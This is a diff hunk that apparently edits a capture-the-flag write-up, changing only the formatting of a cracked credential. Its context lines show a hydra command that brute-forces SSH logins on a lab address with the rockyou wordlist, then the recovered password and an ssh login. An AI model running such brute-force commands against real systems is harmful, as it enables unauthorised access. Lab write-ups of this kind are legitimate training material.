@@ -87,7 +87,7 @@ $ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.202.112 ssh -T 4 -V
 
 Loot:
 
-jake:987654321
+`jake:987654321`
 
 ```
 $ ssh jake@10.10.202.112
